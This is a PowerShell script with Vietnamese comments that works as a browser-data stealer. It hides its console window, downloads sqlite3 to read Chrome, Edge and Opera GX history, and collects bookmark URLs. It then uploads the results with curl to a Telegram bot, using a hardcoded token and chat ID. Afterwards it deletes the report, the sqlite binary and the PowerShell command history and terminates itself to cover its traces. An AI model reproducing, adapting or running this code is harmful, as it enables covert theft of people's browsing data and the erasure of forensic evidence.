<#
    Kịch bản: Thu thập Lịch sử & Bookmarks
#>
param(
    [string]$sqlitePath = "$env:TEMP\sqlite3.exe",
    [string]$hide = 'y'
)

# 1. Cơ chế ẩn cửa sổ ngay lập tức
if($hide -eq 'y'){
    $w=(Get-Process -PID $pid).MainWindowHandle
    $a='[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd,int nCmdShow);'
    $t=Add-Type -MemberDefinition $a -Name Win32ShowWindowAsync -Namespace Win32Functions -PassThru
    if($w -ne [System.IntPtr]::Zero){ [void]$t::ShowWindowAsync($w,0) }
}

# 2. Thiết lập Telegram & Cấu hình
$Token   = "8734606734:AAEW7nl8oRmtFKZV2SdVgtUAnWtPcH7bThw"
$ChatID  = "8312702210"
$TeleURL = "https://api.telegram.org/bot$Token/sendDocument"
$outpath = "$env:TEMP\browser_report.txt"
$Regex   = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'

# --- TỰ ĐỘNG TẢI SQLITE NẾU CHƯA CÓ ---
if (!(Test-Path $sqlitePath)) {
    try {
        $url = "https://www.sqlite.org/2024/sqlite-tools-win64-3450200.zip"
        $zip = "$env:TEMP\sql.zip"
        $extractPath = "$env:TEMP\sql_extracted"
        
        Invoke-WebRequest -Uri $url -OutFile $zip -ErrorAction Stop
        Expand-Archive -Path $zip -DestinationPath $extractPath -Force
        
        # Tìm file exe trong các thư mục con và đưa ra ngoài %TEMP%
        $exe = Get-ChildItem -Path $extractPath -Filter "sqlite3.exe" -Recurse | Select-Object -First 1
        Move-Item -Path $exe.FullName -Destination $sqlitePath -Force
        
        # Dọn dẹp rác sau khi giải nén
        Remove-Item $zip, $extractPath -Recurse -Force -ErrorAction SilentlyContinue
    } catch {
        "Khong the tai SQLite, chi thu thap Bookmarks." | Out-File $outpath -Append
    }
}

# 3. Khởi tạo file kết quả
"--- BROWSER REPORT | $(Get-Date -Format 'dd/MM/yyyy HH:mm') ---`n" | Out-File -FilePath $outpath -Encoding UTF8

# 4. Đường dẫn dữ liệu
$Paths = @{
    'chrome_h'  = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
    'chrome_b'  = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
    'edge_h'    = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\History"
    'edge_b'    = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks"
    'opera_h'   = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"
    'opera_b'   = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks"
}

$Browsers = @('chrome', 'edge', 'opera')

# 5. Quá trình thu thập
foreach ($Browser in $Browsers) {
    # Lấy History (Dùng SQLite)
    $hPath = $Paths["${Browser}_h"]
    if (Test-Path $hPath) {
        $copyH = "$env:TEMP\${Browser}_th"
        Copy-Item $hPath $copyH -Force -ErrorAction SilentlyContinue
        if (Test-Path $sqlitePath) {
            $data = & $sqlitePath $copyH "SELECT url FROM urls ORDER BY last_visit_time DESC LIMIT 20;"
            $data | ForEach-Object { "$Browser [History] | $_" | Out-File $outpath -Append -Encoding UTF8 }
        }
        Remove-Item $copyH -Force -ErrorAction SilentlyContinue
    }

    # Lấy Bookmarks (Dùng Regex)
    $bPath = $Paths["${Browser}_b"]
    if (Test-Path $bPath) {
        $Content = Get-Content -Path $bPath -Raw -ErrorAction SilentlyContinue
        $Matches = [regex]::Matches($Content, $Regex)
        $Matches.Value | Sort-Object -Unique | ForEach-Object {
            "$Browser [Bookmark] | $_" | Out-File $outpath -Append -Encoding UTF8
        }
    }
}

# 6. Gửi lên Telegram và Xóa dấu vết
if (Test-Path $outpath) {
    curl.exe -X POST $TeleURL -F "chat_id=$ChatID" -F "document=@$outpath" | Out-Null
    Start-Sleep -Seconds 3
    
    # Dọn dẹp triệt để
    Remove-Item $outpath -Force -ErrorAction SilentlyContinue
    Remove-Item $sqlitePath -Force -ErrorAction SilentlyContinue
    Remove-Item (Get-PSReadLineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
}

# Tự hủy tiến trình
Stop-Process -Id $PID -Force
